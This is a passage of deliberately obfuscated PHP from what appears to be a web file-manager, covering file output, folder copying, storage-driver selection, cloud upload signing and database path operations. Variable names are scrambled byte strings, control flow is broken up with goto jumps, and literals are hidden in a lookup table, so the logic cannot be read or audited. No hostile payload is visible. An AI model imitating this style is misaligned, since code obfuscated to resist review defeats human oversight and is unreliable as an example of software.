mk_dir($FŠ…ö·•Ò); $a”Á·Û‘™ = $FŠ…ö·•Ò . $B¿¥È„ïÊ; $a”Á·Û‘™ = $A¶Ú›àË¼->download($Aâ‘ Æ‡ß£, $a”Á·Û‘™); goto c³å†‹®ñ‹; d—»ŠÎ©š¢: } public static function pathFather($fÔ¶†) { $Bõ´¡¼ëã = IO::init($fÔ¶†); $aÕ„ª¦áî = $Bõ´¡¼ëã->pathFather($Bõ´¡¼ëã->path); return $Bõ´¡¼ëã->getPathOuter($aÕ„ª¦áî); } public static function fileOut($e™·Şí´»“, $AÍ‹àº¹œ = false, $dàÁøÂÄèÆ = false, $BáéØ½  = '') { $f›»ÁÙÈ” = self::driverMake($e™·Şí´»“); if ($f›»ÁÙÈ”->isFileOutServer()) { return $f›»ÁÙÈ”->fileOutServer($e™·Şí´»“, $AÍ‹àº¹œ, $dàÁøÂÄèÆ, $BáéØ½ ); } return $f›»ÁÙÈ”->fileOut($e™·Şí´»“, $AÍ‹àº¹œ, $dàÁøÂÄèÆ, $BáéØ½ ); } public static function fileOutImage($eÄÏçÔƒœé, $cŠùø”Îáø = 250) { $ešÔÕß¶àæ = array(250, 600, 1200, 3000, 5000); for ($a³„®æ¼öª = 0; $a³„®æ¼öª < count($ešÔÕß¶àæ); $a³„®æ¼öª++) { if ($a³„®æ¼öª == 0 && $cŠùø”Îáø <= $ešÔÕß¶àæ[$a³„®æ¼öª]) { $cŠùø”Îáø = $ešÔÕß¶àæ[$a³„®æ¼öª]; break; } else { if ($cŠùø”Îáø > $ešÔÕß¶àæ[$a³„®æ¼öª - 1] && $cŠùø”Îáø <= $ešÔÕß¶àæ[$a³„®æ¼öª]) { $cŠùø”Îáø = $ešÔÕß¶àæ[$a³„®æ¼öª]; break; } else { if ($a³„®æ¼öª == count($ešÔÕß¶àæ) - 1 && $cŠùø”Îáø > $ešÔÕß¶àæ[$a³„®æ¼öª]) { $cŠùø”Îáø = $ešÔÕß¶àæ[$a³„®æ¼öª]; break; } } } } $Bº²¦Œ•°¤ = self::driverMake($eÄÏçÔƒœé); if ($Bº²¦Œ•°¤->isFileOutServer()) { return $Bº²¦Œ•°¤->fileOutImageServer($eÄÏçÔƒœé, $cŠùø”Îáø); } return $Bº²¦Œ•°¤->fileOutImage($eÄÏçÔƒœé, $cŠùø”Îáø); } private static function driverIsSame($aÌëÀ™µ, $Fí¨°„¾Ş½) { goto CÜ¹¥ÔÎ×; CÜ¹¥ÔÎ×: $A…Š†ÒÌœº =& $_SERVER[…ë˜õ]; $B´ƒ†Ä®¤¾ = $aÌëÀ™µ->getType(); $CÎéç‘º•î = $Fí¨°„¾Ş½->getType(); goto d‘Ñ´µ¼è; dÁÓãëÎÙä: if ($aÌëÀ™µ->pathDriver == $Fí¨°„¾Ş½->pathDriver) { return !0; } return !1; goto DÜÓ•çëôÅ; d‘Ñ´µ¼è: if ($B´ƒ†Ä®¤¾ != $CÎéç‘º•î) { return !1; } if ($B´ƒ†Ä®¤¾ == $A…Š†ÒÌœº[736]) { return !0; } if ($B´ƒ†Ä®¤¾ == $A…Š†ÒÌœº[105]) { return !0; } goto dÁÓãëÎÙä; DÜÓ•çëôÅ: } public static function copyUpdate($BÃÑÎ™ÜÏù, $b˜¢‚ù„ê) { goto DÑİÂŞ¦Û÷; béã¥õ¹•‰: $aÛÖÚ•ë¬È = array(); foreach ($b±¶ÖŠ´”Ê as $dÑ™»½È—è => $bšßâÉåÖ·) { if (isset($EÀÓ‘²®¸[$dÑ™»½È—è])) { if ($bšßâÉåÖ·[$FéŞÉò¬÷ƒ[76]] == 1) { continue; } if ($EÀÓ‘²®¸[$dÑ™»½È—è][$FéŞÉò¬÷ƒ[77]] == $bšßâÉåÖ·[$FéŞÉò¬÷ƒ[77]]) { continue; } } if ($bšßâÉåÖ·[$FéŞÉò¬÷ƒ[76]] == 1) { $aÛÖÚ•ë¬È[] = $b˜¢‚ù„ê . $FéŞÉò¬÷ƒ[8] . $dÑ™»½È—è; continue; } $dÔÌ„ô¿©  = strstr(trim($dÑ™»½È—è, $FéŞÉò¬÷ƒ[8]), $FéŞÉò¬÷ƒ[8]) ? get_path_father($dÑ™»½È—è) : $FéŞÉò¬÷ƒ[33]; $D¦¼¸¸¿°[] = array($FéŞÉò¬÷ƒ[1060] => $bšßâÉåÖ·[$FéŞÉò¬÷ƒ[75]], $FéŞÉò¬÷ƒ[1061] => rtrim($b˜¢‚ù„ê, $FéŞÉò¬÷ƒ[8]) . $FéŞÉò¬÷ƒ[8] . $dÔÌ„ô¿© , $FéŞÉò¬÷ƒ[1062] => $bšßâÉåÖ·); } $cñÎˆ‘ß±ë = array($FéŞÉò¬÷ƒ[191] => $D¦¼¸¸¿°, $FéŞÉò¬÷ƒ[76] => $aÛÖÚ•ë¬È); goto DÑÅ”äˆ¥¬; DÑÅ”äˆ¥¬: Hook::trigger($FéŞÉò¬÷ƒ[1063], $BÃÑÎ™ÜÏù, $b˜¢‚ù„ê, $cñÎˆ‘ß±ë); foreach ($aÛÖÚ•ë¬È as $bšßâÉåÖ·) { IO::mkdir($bšßâÉåÖ·); } foreach ($D¦¼¸¸¿° as $bšßâÉåÖ·) { IO::copy($bšßâÉåÖ·[$FéŞÉò¬÷ƒ[1060]], $bšßâÉåÖ·[$FéŞÉò¬÷ƒ[1061]], REPEAT_REPLACE); } goto c¶Öİ’È«­; DÑİÂŞ¦Û÷: $FéŞÉò¬÷ƒ =& $_SERVER[…ë˜õ]; if (!IO::exist($BÃÑÎ™ÜÏù)) { return !1; } if (!IO::exist($b˜¢‚ù„ê)) { IO::mkdir($b˜¢‚ù„ê); } goto d«×õÓåŠ; d«×õÓåŠ: $b±¶ÖŠ´”Ê = self::_listAll($BÃÑÎ™ÜÏù); $EÀÓ‘²®¸ = self::_listAll($b˜¢‚ù„ê); $D¦¼¸¸¿° = array(); goto béã¥õ¹•‰; c¶Öİ’È«­: } private static function _listAll($c´“ª¶ù§†) { $eÙ‰ÈĞ¦° =& $_SERVER[…ë˜õ]; $c´“ª¶ù§† = KodIO::clear($c´“ª¶ù§†); $d Ì‘Š¾„¦ = IO::listAll($c´“ª¶ù§†); foreach ($d Ì‘Š¾„¦ as &$bŞ“Šà¤«Ù) { $D”òàÃ´Š = substr($bŞ“Šà¤«Ù[$eÙ‰ÈĞ¦°[75]], strlen($c´“ª¶ù§†)); $bŞ“Šà¤«Ù[$eÙ‰ÈĞ¦°[1064]] = trim($D”òàÃ´Š, $eÙ‰ÈĞ¦°[8]); } unset($bŞ“Šà¤«Ù); return array_to_keyvalue($d Ì‘Š¾„¦, $eÙ‰ÈĞ¦°[1064]); } public static function fileSubstr($CÇÛ§‹­ã , $B‚Ñ‚Ğ‹æø, $cîÉÒåŸÉª = false) { goto fî¸Òâ£ÂÔ; BÀÓå©”¤’: if (!$b·±¹…–¶ì && $cîÉÒåŸÉª && isset($GLOBALS[$fºùàçÙ‡§[1067]])) { throw new Exception($GLOBALS[$fºùàçÙ‡§[1067]][$fºùàçÙ‡§[1068]]); } return $b·±¹…–¶ì; goto cÄ«…ƒµãÕ; d¬‘‘‰À: $DŞÜù”Õˆ› = $B‚Ñ‚Ğ‹æø; $D„Ğ†ÉÏš = $cîÉÒåŸÉª; if ($B‚Ñ‚Ğ‹æø < 0) { $B‚Ñ‚Ğ‹æø = $D‰ƒ¿„âÍø + $B‚Ñ‚Ğ‹æø; } goto BµÊ¿à‘š±; cµ»ÑÓ”äë: if ($cîÉÒåŸÉª <= 0) { return $fºùàçÙ‡§[33]; } if ($B‚Ñ‚Ğ‹æø < 0 || $B‚Ñ‚Ğ‹æø >= $D‰ƒ¿„âÍø || $cîÉÒåŸÉª > 1024 * 1024 * 5) { throw new Exception("\x66\x69\154\145\x52\x65\141\x64\x20\145\162\162\x6f\162\x21\40\x73\x74\141\x72\164\x3d{$B‚Ñ‚Ğ‹æø}\x3b\154\x65\x6e\147\164\150\x3d{$cîÉÒåŸÉª}\73\40\x73\151\172\145\x3d{$D‰ƒ¿„âÍø}\x3b"); } $b·±¹…–¶ì = $e®á¡á“’’->fileSubstr($CÇÛ§‹­ã , $B‚Ñ‚Ğ‹æø, $cîÉÒåŸÉª); goto BÀÓå©”¤’; BµÊ¿à‘š±: if ($cîÉÒåŸÉª === !1) { $cîÉÒåŸÉª = $D‰ƒ¿„âÍø - $B‚Ñ‚Ğ‹æø; } if ($B‚Ñ‚Ğ‹æø + $cîÉÒåŸÉª > $D‰ƒ¿„âÍø) { $cîÉÒåŸÉª = $D‰ƒ¿„âÍø - $B‚Ñ‚Ğ‹æø; } if (!$D‰ƒ¿„âÍø && $e®á¡á“’’->getType() == $fºùàçÙ‡§[105] && !$e®á¡á“’’->exist($CÇÛ§‹­ã )) { throw new Exception($fºùàçÙ‡§[1065] . LNG($fºùàçÙ‡§[1066]) . $fºùàçÙ‡§[930] . get_path_this($CÇÛ§‹­ã ) . $fºùàçÙ‡§[33]); } goto cµ»ÑÓ”äë; fî¸Òâ£ÂÔ: $fºùàçÙ‡§ =& $_SERVER[…ë˜õ]; $e®á¡á“’’ = self::driverMake($CÇÛ§‹­ã ); $D‰ƒ¿„âÍø = $e®á¡á“’’->size($CÇÛ§‹­ã ); goto d¬‘‘‰À; cÄ«…ƒµãÕ: } private static function driverMake(&$F¸Ò›˜‡á’) { goto c¶ÎØá‘š…; B±¾·ÉÍêÅ: return $aöš÷‚äò÷; goto fË¼µÎ£µÙ; c¶ÎØá‘š…: $b«”È…ìÛ =& $_SERVER[…ë˜õ]; $Fˆ‚¡ËÙƒÅ = KodIO::parse($F¸Ò›˜‡á’); if (!self::$driverListSystem) { $eë§¨ìÏá‹ = Model($b«”È…ìÛ[745])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($eë§¨ìÏá‹, $b«”È…ìÛ[388]); } goto dŒß‡… ; dŒß‡… : if ($Fˆ‚¡ËÙƒÅ[$b«”È…ìÛ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$Fˆ‚¡ËÙƒÅ[$b«”È…ìÛ[388]]]) { return !1; } $F¸Ò›˜‡á’ = $Fˆ‚¡ËÙƒÅ[$b«”È…ìÛ[1069]]; $aöš÷‚äò÷ = self::driverGet($Fˆ‚¡ËÙƒÅ, $F¸Ò›˜‡á’); goto B±¾·ÉÍêÅ; fË¼µÎ£µÙ: } private static function driverGet($F®Š”«‹ÌÃ, &$d¿‹¦…ÜÚ­) { goto eø¬•›ÄÖŠ; fäİ±½¼é: switch ($F®Š”«‹ÌÃ[$F´„«ñÊ†¨[29]]) { case KodIO::KOD_IO: $bëè†‚Ìµ = self::$driverListSystem[$cï–£‡ß]; break; case KodIO::KOD_SOURCE: $d¿‹¦…ÜÚ­ = $cï–£‡ß . $d¿‹¦…ÜÚ­; $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1072], $F´„«ñÊ†¨[6] => $F®Š”«‹ÌÃ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $D®ãñ…¦ÏØ = $GLOBALS[$F´„«ñÊ†¨[1073]]; self::$driverListUser = array_to_keyvalue($D®ãñ…¦ÏØ, $F´„«ñÊ†¨[388]); } $bëè†‚Ìµ = self::$driverListUser[$cï–£‡ß]; break; case KodIO::KOD_SHARE_LINK: $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1074], $F´„«ñÊ†¨[6] => $F®Š”«‹ÌÃ); $dÑˆ¾‹¬²– = Action($F´„«ñÊ†¨[1075])->sharePathInfo($F®Š”«‹ÌÃ[$F´„«ñÊ†¨[75]]); $d¿‹¦…ÜÚ­ = $dÑˆ¾‹¬²–[$F´„«ñÊ†¨[390]]; if (!$dÑˆ¾‹¬²–[$F´„«ñÊ†¨[390]]) { $c¸˜œŒ†“ = Model($F´„«ñÊ†¨[558])->getInfo($dÑˆ¾‹¬²–[$F´„«ñÊ†¨[462]]); $d¿‹¦…ÜÚ­ = KodIO::clear($c¸˜œŒ†“[$F´„«ñÊ†¨[1076]] . $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1069]]); $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[460]] = $c¸˜œŒ†“; $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1053]] = $d¿‹¦…ÜÚ­; $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1077], $F´„«ñÊ†¨[6] => $F®Š”«‹ÌÃ); } break; case KodIO::KOD_SHARE_ITEM: $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1078], $F´„«ñÊ†¨[6] => $F®Š”«‹ÌÃ); $c¸˜œŒ†“ = Model($F´„«ñÊ†¨[558])->getInfo($F®Š”«‹ÌÃ[$F´„«ñÊ†¨[388]]); if ($c¸˜œŒ†“[$F´„«ñÊ†¨[390]] == $F´„«ñÊ†¨[491]) { $d¿‹¦…ÜÚ­ = KodIO::clear($c¸˜œŒ†“[$F´„«ñÊ†¨[1076]] . $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1069]]); $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[460]] = $c¸˜œŒ†“; $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1053]] = $d¿‹¦…ÜÚ­; $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1079], $F´„«ñÊ†¨[6] => $F®Š”«‹ÌÃ); } else { if (!$d¿‹¦…ÜÚ­) { $d¿‹¦…ÜÚ­ = $c¸˜œŒ†“[$F´„«ñÊ†¨[390]]; } } break; default: $d¿‹¦…ÜÚ­ = $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[75]]; $bëè†‚Ìµ = array($F´„«ñÊ†¨[1071] => $F´„«ñÊ†¨[1080]); break; } $fˆù’æëÁŸ = $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[75]]; if (!isset(self::$driverCache[$fˆù’æëÁŸ])) { $dóèøƒİ°× = strtolower($bëè†‚Ìµ[$F´„«ñÊ†¨[93]]); $déâ‹”ÕĞ = $GLOBALS[$F´„«ñÊ†¨[6]][$F´„«ñÊ†¨[87]][$F´„«ñÊ†¨[797]]; $EÂï”‡¯á¦ = $F´„«ñÊ†¨[71] . (isset($déâ‹”ÕĞ[$dóèøƒİ°×]) ? $déâ‹”ÕĞ[$dóèøƒİ°×] : ucfirst($dóèøƒİ°×)); if (!class_exists($EÂï”‡¯á¦)) { show_json("{$EÂï”‡¯á¦}\x20\156\x6f\164\40\x65\x78\x69\163\164\163\41", !1); } $fÏ¿ÀÎÀÏ = isset($bëè†‚Ìµ[$F´„«ñÊ†¨[6]]) ? $bëè†‚Ìµ[$F´„«ñÊ†¨[6]] : !1; self::$driverCache[$fˆù’æëÁŸ] = new $EÂï”‡¯á¦($fÏ¿ÀÎÀÏ); } goto EÅÛ§­¶£¡; EÅÛ§­¶£¡: $däƒ›À´Ëî = self::$driverCache[$fˆù’æëÁŸ]; $däƒ›À´Ëî->pathDriver = $dá’ÀæÈå; $däƒ›À´Ëî->pathBase = $F´„«ñÊ†¨[33]; goto Dâğãçƒ‘é; Dâğãçƒ‘é: if (isset($bëè†‚Ìµ[$F´„«ñÊ†¨[6]][$F´„«ñÊ†¨[1081]])) { $däƒ›À´Ëî->pathBase = rtrim($bëè†‚Ìµ[$F´„«ñÊ†¨[6]][$F´„«ñÊ†¨[1081]], $F´„«ñÊ†¨[8]) . $F´„«ñÊ†¨[8]; $d¿‹¦…ÜÚ­ = $däƒ›À´Ëî->pathBase . ltrim($d¿‹¦…ÜÚ­, $F´„«ñÊ†¨[8]); } $d¿‹¦…ÜÚ­ = $däƒ›À´Ëî->getPath($d¿‹¦…ÜÚ­); if (isset($F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1053]])) { $d¿‹¦…ÜÚ­ = $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1053]]; } goto Bƒ£—¼¤ƒå; eø¬•›ÄÖŠ: $F´„«ñÊ†¨ =& $_SERVER[…ë˜õ]; $dá’ÀæÈå = $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[1070]]; $cï–£‡ß = $F®Š”«‹ÌÃ[$F´„«ñÊ†¨[388]]; goto fäİ±½¼é; Bƒ£—¼¤ƒå: $däƒ›À´Ëî->path = $d¿‹¦…ÜÚ­; return $däƒ›À´Ëî; goto DÌÊÜ‘ØòË; DÌÊÜ‘ØòË: } public static function errorTips($aÉÆŠ„îÏ = false) { goto Cöò½áå; Cöò½áå: $a×±¬İö¤‘ =& $_SERVER[…ë˜õ]; static $BÛôàÀó¦ = array(); $DªÑŸ×‹Ÿ¡ = 1000; goto A¯óç·´ï; A¯óç·´ï: if ($aÉÆŠ„îÏ === -1) { return $BÛôàÀó¦ ? $BÛôàÀó¦[count($BÛôàÀó¦) - 1] : $a×±¬İö¤‘[33]; } if ($aÉÆŠ„îÏ === !1) { return implode($a×±¬İö¤‘[227], $BÛôàÀó¦); } if (count($BÛôàÀó¦) >= $DªÑŸ×‹Ÿ¡) { $BÛôàÀó¦ = array_slice($BÛôàÀó¦, $DªÑŸ×‹Ÿ¡ * 0.5, $DªÑŸ×‹Ÿ¡); } goto e„á“ ½Ò; e„á“ ½Ò: $BÛôàÀó¦[] = $aÉÆŠ„îÏ; write_log($a×±¬İö¤‘[159] . ACTION . $a×±¬İö¤‘[1082] . $aÉÆŠ„îÏ, $a×±¬İö¤‘[1083]); goto Eê Ü¸ÙŠ; Eê Ü¸ÙŠ: } public static function getLastError($FÏø÷˜Ù‡ğ = '') { $côËã¯×Á¬ = self::errorTips(-1); return $côËã¯×Á¬ ? $côËã¯×Á¬ : $FÏø÷˜Ù‡ğ; } } goto F‡äÛ‘æ¿»; F¼‰Ó¾‘¨•: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($FÔÈ¶ÙŠÜ) { parent::__construct($FÔÈ¶ÙŠÜ); $this->signatureVersion($_SERVER[…ë˜õ][210]); } public function uploadFormData($bø‰ƒŠºÅ­, $c¸Ùçù«Ãİ = 3600) { goto eİõ§«ËŞŠ; a´§ìíÔ: $B­é’©‰ï = array($e«‘ˆÓù˜[1194] => $d»íÒæéâÉ, $e«‘ˆÓù˜[1195] => array(array($e«‘ˆÓù˜[1196] => $bøóß¸äÂ), array($e«‘ˆÓù˜[1197] => $this->bucket), array($e«‘ˆÓù˜[1198], $e«‘ˆÓù˜[1199], $e«‘ˆÓù˜[33]), array($e«‘ˆÓù˜[1200] => $e­ÊƒÂÆì), array($e«‘ˆÓù˜[1201] => $C÷†í™¹…¶), array($e«‘ˆÓù˜[1202] => $this->accessKey), array($e«‘ˆÓù˜[1203] => $fÒÍÈÀĞõš))); $B­é’©‰ï = json_encode($B­é’©‰ï); $fò¶½¦íÄì = hash_hmac($e«‘ˆÓù˜[228], $fÒÍÈÀĞõš, $this->secret); goto D‘ñ•Äàì; D‘ñ•Äàì: $BØÒ•„ë˜ = sha1($B­é’©‰ï); $e“èÆ“•‚Ë = hash_hmac($e«‘ˆÓù˜[228], $BØÒ•„ë˜, $fò¶½¦íÄì); $DÄ™Š‹¬Á = array($e«‘ˆÓù˜[1196] => $bøóß¸äÂ, $e«‘ˆÓù˜[1200] => $e­ÊƒÂÆì, $e«‘ˆÓù˜[1204] => base64_encode($B­é’©‰ï), $e«‘ˆÓù˜[1201] => $C÷†í™¹…¶, $e«‘ˆÓù˜[1202] => $this->accessKey, $e«‘ˆÓù˜[1205] => $fÒÍÈÀĞõš, $e«‘ˆÓù˜[1206] => $e“èÆ“•‚Ë, $e«‘ˆÓù˜[174] => $this->getHost()); goto b©ˆÉÙØõÏ; b©ˆÉÙØõÏ: return $DÄ™Š‹¬Á; goto b±‰‚ğ‘ò†; d¬Ë’´á¹ß: $e­ÊƒÂÆì = $e«‘ˆÓù˜[1192]; $d»íÒæéâÉ = gmdate($e«‘ˆÓù˜[1193], time() + $c¸Ùçù«Ãİ); $fÒÍÈÀĞõš = (string) time() . $e«‘ˆÓù˜[67] . (string) (time() + $c¸Ùçù«Ãİ); goto a´§ìíÔ; eİõ§«ËŞŠ: $e«‘ˆÓù˜ =& $_SERVER[…ë˜õ]; $bøóß¸äÂ = $e«‘ˆÓù˜[190]; $C÷†í™¹…¶ = $e«‘ˆÓù˜[228]; goto d¬Ë’´á¹ß; b±‰‚ğ‘ò†: } public function fileOutLink($EÒä¦‹ä‰«) { $eÃµŠ§Ï =& $_SERVER[…ë˜õ]; if (substr($EÒä¦‹ä‰«, 0, 7) == $eÃµŠ§Ï[1207]) { $EÒä¦‹ä‰« = $eÃµŠ§Ï[1208] . substr($EÒä¦‹ä‰«, 7); } header($eÃµŠ§Ï[158] . $EÒä¦‹ä‰«); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($A˜Ç´°ƒŒë) { $this->pathParse = $A˜Ç´°ƒŒë; $this->model = Model($_SERVER[…ë˜õ][1209]); } public function getPath($C‚­âõÉç) { return trim($C‚­âõÉç, $_SERVER[…ë˜õ][8]); } public function pathFather($A™ô®ªòçæ) { $d‰ª”¤äœ† = $this->parse($A™ô®ªòçæ); $d‰ª”¤äœ† = $this->infoSimple($A™ô®ªòçæ); return $d‰ª”¤äœ† ? $d‰ª”¤äœ†[$_SERVER[…ë˜õ][472]] : !1; } public function pathThis($eß‘áÄ¨ÆÆ) { $DÌİÌğ–è = $this->infoSimple($eß‘áÄ¨ÆÆ); return $DÌİÌğ–è ? $DÌİÌğ–è[$_SERVER[…ë˜õ][28]] : !1; } public function getPathOuter($BŸ‡éŠ¾Ä) { if (!$BŸ‡éŠ¾Ä) { return $BŸ‡éŠ¾Ä; } $fÈÅ¨Ô¡¹Ğ = $this->parse($BŸ‡éŠ¾Ä); return KodIO::make($fÈÅ¨Ô¡¹Ğ[$_SERVER[…ë˜õ][388]]); } public function copyFolderFromIO($c«ìëìÒ“Ğ, $F¾­…£ˆÎ, $dÕµ´é¿œ…, $aÖ¥³šòà, $A¤®Ö±—¥Œ) { $e×å¤—»·ê = $this->model->copyFolderFromIO($c«ìëìÒ“Ğ, $F¾­…£ˆÎ, $dÕµ´é¿œ…, $aÖ¥³šòà, $A¤®Ö±—¥Œ); return KodIO::make($e×å¤—»·ê); } public function isParentOf($Dˆ¹ªÕ³éï, $F®“•ˆÖ¢Ï) { return $this->model->isParentOf($Dˆ¹ªÕ³éï, $F®“•ˆÖ¢Ï); } public function mkfile($d†ÈÀ‡µ¢, $Bè†øĞ±…± = '', $bîßî–ÍŞ‚ = REPEAT_RENAME) { $cŞ½Ş’¢¾ =& $_SERVER[…ë˜õ]; $A‹êë»òà = $this->parse($d†ÈÀ‡µ¢); $d†ÈÀ‡µ¢ = $A‹êë»òà[$cŞ½Ş’¢¾[388]]; for ($e ğšÆ‹çï = 0; $e ğšÆ‹çï < count($A‹êë»òà[$cŞ½Ş’¢¾[1210]]); $e ğšÆ‹çï++) { $Bíô£®Ø = $A‹êë»òà[$cŞ½Ş’¢¾[1210]][$e ğšÆ‹çï]; if ($e ğšÆ‹çï == count($A‹êë»òà[$cŞ½Ş’¢¾[1210]]) - 1) { $d†ÈÀ‡µ¢ = $this->model->mkfile($d†ÈÀ‡µ¢, $Bíô£®Ø, $Bè†øĞ±…±, $bîßî–ÍŞ‚); break; } $d†ÈÀ‡µ¢ = $this->model->mkdir($d†ÈÀ‡µ¢, $Bíô£®Ø, REPEAT_SKIP); } return $this->getPathOuter($d†ÈÀ‡µ¢); } public function mkdir($CÇá†£‰é, $e…¬ªã¼éä = REPEAT_SKIP) { $EÎ–²Šêº =& $_SERVER[…ë˜õ]; $c–¥´’„ºÕ = $this->parse($CÇá†£‰é); $CÇá†£‰é = $c–¥´’„ºÕ[$EÎ–²Šêº[388]]; for ($E™êö•¼×é = 0; $E™êö•¼×é < count($c–¥´’„ºÕ[$EÎ–²Šêº[1210]]); $E™êö•¼×é++) { $eåòí¢õµ° = $c–¥´’„ºÕ[$EÎ–²Šêº[1210]][$E™êö•¼×é]; $CÇá†£‰é = $this->model->mkdir($CÇá†£‰é, $eåòí¢õµ°, $e…¬ªã¼éä); } return $this->getPathOuter($CÇá†£‰é); } public function copyFile($fá—½ˆ¤ßç, $Fà¿ßÆ»˜, $Eé­í»¨— = REPEAT_REPLACE) { $eŒì‹ŠÒºò =& $_SERVER[…ë˜õ]; $e˜£ÖĞ¹¿ª = $this->parse($Fà¿ßÆ»˜); $f°æÅ¦ï˜ = $this->model->copy($fá—½ˆ¤ßç, $e˜£ÖĞ¹¿ª[$eŒì‹ŠÒºò[388]], $Eé­í»¨—, $e˜£ÖĞ¹¿ª[$eŒì‹ŠÒºò[75]]); return $f°æÅ¦ï˜ ? $this->getPathOuter($f°æÅ¦ï˜) : !1; } public function moveFile($A¼è«…ƒ¯, $Aç‡µÆçë, $EÙŠÖŞÆ»· = REPEAT_REPLACE) { $eˆº‚àº‰¾ =& $_SERVER[…ë˜õ]; $E‚ƒï‚¨É = $this->parse($Aç‡µÆçë); $B¢¨Àá©„© = $this->model->move($A¼è«…ƒ¯, $E‚ƒï‚¨É[$eˆº‚àº‰¾[388]], $EÙŠÖŞÆ»·, $E‚ƒï‚¨É[$eˆº‚àº‰¾[75]]); return $B¢¨Àá©„© ? $this->getPathOuter($B¢¨Àá©„©) : !1; } public function copy($C ¨Š‡¬¿­, $eÎ¬„ÍºÅ˜, $AæÙ¦˜¨ˆ = REPEAT_REPLACE) { $cøÏ¤²¢½« = $this->parse($eÎ¬„ÍºÅ˜); $D„“ò»Á¿ = $this->model->copy($C ¨Š‡¬¿­, $cøÏ¤²¢½«[$_SERVER[…ë˜õ][388]], $AæÙ¦˜¨ˆ); return $D„“ò»Á¿ ? $this->getPathOuter($D„“ò»Á¿) : !1; } public function moveSameAllow() { } public function move($b¦ÈÎªí²Î, $F²ÚÆ„¼ä, $eñ¸¼»Ÿ²ô = REPEAT_REPLACE) { $B®…¤÷Äœœ = $this->parse($F²ÚÆ„¼ä); $Cø™”„Ü” = $this->model->move($b¦ÈÎªí²Î, $B®…¤÷Äœœ[$_SERVER[…ë˜õ][388]], $eñ¸¼»Ÿ²ô); return $Cø™”„Ü” ? $this->getPathOuter($Cø™”„Ü”) : !1; } public function remove($A×Ô¿Š¢ô, $aˆœÍƒ×øŒ = true) { return $this->model->remove($A×Ô¿Š¢ô, $aˆœÍƒ×øŒ); } public function rename($Eî‘øŸñƒ, $Böˆ„í³ëÕ) { $F–àÙ“÷’Û = $this->model->rename($Eî‘øŸñƒ, $Böˆ„í³ëÕ); return $F–àÙ“÷’Û ? $this->getPathOuter($Eî‘øŸñƒ) : $F–àÙ“÷’Û; } public function size($b˜Ï ¡ƒ¢Û) { $bÛ¯ÀĞ‚œÆ = $this->infoSimple($b˜Ï ¡ƒ¢Û); return $bÛ¯ÀĞ‚œÆ ? $bÛ¯ÀĞ‚œÆ[$_SERVER[…ë˜õ][77]] : 0; } public function infoSimple($eğŠÄ¾¾‡Ğ) { return $this->model->sourceInfo($eğŠÄ¾¾‡Ğ); } public function info($cà´éè˜ë®) { return $this->infoParse($cà´éè˜ë®); } public function infoAuth($D™Ã‚æ—) { return $this->infoParse($D™Ã‚æ—, !1, !0); } public function infoWithChildren($aÈæà«£³¢) { return $this->infoParse($aÈæà«£³¢, !0); } protected function infoParse($EÜ÷Ê°®Ÿ, $dÍñ¨¡–ÁÓ = false, $fŞ…±‘¬‰« = false) { if (!$dÍñ¨¡–ÁÓ) { return $this->model->pathInfo($EÜ÷Ê°®Ÿ, $fŞ…±‘¬‰«); } return $this->model->pathInfoMore($EÜ÷Ê°®Ÿ); } public function infoFull($BŞØÎ’Óºï) { $c›¾“‰Î =& $_SERVER[…ë˜õ]; $A¬ÑÅ—ò = explode($c›¾“‰Î[8], $BŞØÎ’Óºï); $fï»’öìğ¥ = implode($c›¾“‰Î[8], array_splice($A¬ÑÅ—ò, 1)); return $this->model->pathInfoByPath($A¬ÑÅ—ò[0], $fï»’öìğ¥); } public function hashSimple($D¥Õ‹³°¯) { $eÀ¶¥ïï»“ =& $_SERVER[…ë˜õ]; $b·œåÉ¶õ° = $this->infoWithChildren($D¥Õ‹³°¯); return $b·œåÉ¶õ°[$eÀ¶¥ïï»“[163]][$eÀ¶¥ïï»“[170]]; } public function hashMd5($Fïä‚¦’‘ì) { $cøïß†Ú— =& $_SERVER[…ë˜õ]; $BÑ´÷’ƒ¸Æ = $this->infoWithChildren($Fïä‚¦’‘ì); return $BÑ´÷’ƒ¸Æ[$cøïß†Ú—[163]][$cøïß†Ú—[169]]; } public function exist($Bë©Ù¨Œ¼‚) { $a‚îÄø–†  =& $_SERVER[…ë˜õ]; $f‘ª×ÑÄ¾ = $this->parse($Bë©Ù¨Œ¼‚); if (!$f‘ª×ÑÄ¾[$a‚îÄø–† [75]]) { return $this->isFile($Bë©Ù¨Œ¼‚) || $this->isFolder($Bë©Ù¨Œ¼‚); } $F‹ØÆ˜òÂÑ = array($a‚îÄø–† [389] => $f‘ª×ÑÄ¾[$a‚îÄø–† [388]], $a‚îÄø–† [28] => $f‘ª×ÑÄ¾[$a‚îÄø–† [75]]); $eùñ¢•¨šæ = $this->model->where($F‹ØÆ˜òÂÑ)->find(); return $eùñ¢•¨šæ ? !0 : !1; } public function isFile($a©”îŞØ¼ø) { $f‹‘ÁÚÒÖ” =& $_SERVER[…ë˜õ]; $Eä’ŒƒéŒé = $this->infoSimple($a©”îŞØ¼ø); return $Eä’ŒƒéŒé && $Eä’ŒƒéŒé[$f‹‘ÁÚÒÖ”[397]] == $f‹‘ÁÚÒÖ”[86] ? !1 : !0; } public function isFolder($e™…×Ÿ“çØ) { $bè®òïôš =& $_SERVER[…ë˜õ]; 